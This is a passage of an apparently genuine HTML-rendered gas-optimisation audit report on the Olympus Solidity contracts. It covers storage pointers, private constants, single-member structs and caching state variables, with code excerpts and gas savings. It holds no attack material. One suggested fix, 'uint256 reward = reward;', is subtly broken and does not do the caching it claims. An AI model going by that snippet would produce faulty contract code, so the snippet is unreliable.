class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">.</span><span class=\"mtk11\">hasRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">role</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Policy_OnlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">role</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyExecutor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">executor</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Kernel_OnlyExecutor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Modifier to check if caller is the roles admin.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyAdmin</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">admin</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Kernel_OnlyAdmin</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191\">188-191</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyWhileActive</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">active</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Operator_Inactive</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol\">src/modules/PRICE.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Price_NotInitialized</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @note 4 instances</span></span></span></code></pre>\n<h2 id=\"g-02--storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-7-instances\" style=\"position:relative;\"><a href=\"#g-02--storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-7-instances\" aria-label=\"g 02  storage pointer to a structure is cheaper than copying each value of the structure into memory same for array and mapping 7 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02]  <code>storage</code> pointer to a structure is cheaper than copying each value of the structure into <code>memory</code>, same for <code>array</code> and <code>mapping</code> (7 instances)</h2>\n<p>Deployment Gas Saved: <strong>188 639</strong><br>\nMethod Call Gas Saved: <strong>5 032</strong><br></p>\n<p>It may not be obvious, but every time you copy a storage <code>struct</code>/<code>array</code>/<code>mapping</code> to a <code>memory</code> variable, you are literally copying each member by reading it from <code>storage</code>, which is expensive. And when you use the <code>storage</code> keyword, you are just storing a pointer to the storage, which is much cheaper.</p>\n<ul>\n<li>src/Kernel.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379\">379</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Policy</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dependents</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">moduleDependents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p>fix(the same for others):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Policy</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dependents</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">moduleDependents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">keycode_</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<ul>\n<li>src/policies/BondCallback.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179\">179</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">marketAmounts</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amountsPerMarket</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id_</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206\">206</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">        </span><span class=\"mtk12\">ProposalMetadata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">getProposalMetadata</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206\">205-206</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385\">384-385</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440\">439-440</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666\">666</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/// Cache config in memory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">config_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">            </span><span class=\"mtk3\">/// Cache config struct to avoid multiple SLOADs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">385</span><span class=\"mtk1\">            </span><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">config_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">439</span><span class=\"mtk1\">            </span><span class=\"mtk3\">/// Cache config struct to avoid multiple SLOADs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">440</span><span class=\"mtk1\">            </span><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">config_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">666</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Regen</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">regen</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">low</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-03--using-private-rather-than-public-for-constants-saves-gas-8-instances\" style=\"position:relative;\"><a href=\"#g-03--using-private-rather-than-public-for-constants-saves-gas-8-instances\" aria-label=\"g 03  using private rather than public for constants saves gas 8 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03]  Using <code>private</code> rather than <code>public</code> for constants, saves gas (8 instances)</h2>\n<p>If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table</p>\n<p>Deployment Gas Saved: <strong>45 857</strong><br>\nMethod Call Gas Saved: <strong>308</strong><br></p>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137\">119-137</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev    This is set to 1% of the total supply.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SUBMISSION_REQUIREMENT</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Amount of time a submitted proposal has to activate before it expires.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ACTIVATION_DEADLINE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GRACE_PERIOD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Endorsements required to activate a proposal as percentage of total supply.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ENDORSEMENT_THRESHOLD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Net votes required to execute a proposal on chain as a percentage of total supply.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EXECUTION_THRESHOLD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">33</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Required time for a proposal to be active before it can be executed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev    This amount should be greater than 0 to prevent flash loan attacks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EXECUTION_TIMELOCK</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89\">89</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FACTOR_SCALE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/modules/RANGE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65\">65</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FACTOR_SCALE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-04-use-elementary-types-or-a-user-defined-type-instead-of-a-struct-that-has-only-one-member-1-instances\" style=\"position:relative;\"><a href=\"#g-04-use-elementary-types-or-a-user-defined-type-instead-of-a-struct-that-has-only-one-member-1-instances\" aria-label=\"g 04 use elementary types or a user defined type instead of a struct that has only one member 1 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Use elementary types or a user-defined <code>type</code> instead of a <code>struct</code> that has only one member (1 instances)</h2>\n<p>Deployment Gas Saved: <strong>30 714</strong><br>\nMethod Call Gas Saved: <strong>1 037</strong><br></p>\n<ul>\n<li>src/modules/RANGE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35\">33-35</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">     </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Line</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Price for the specified level</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"g-05-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g-05-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g 05 state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>Deployment Gas Saved: <strong>24 021</strong><br>\nMethod Call Gas Saved: <strong>614</strong><br></p>\n<p>SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.</p>\n<ul>\n<li>src/policies/Heart.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113\">112-113</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">        </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardIssued</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reward</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardIssued</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ul>\n<li>src/policies/BondCallback.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75\">68-75</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">         </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">         </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span 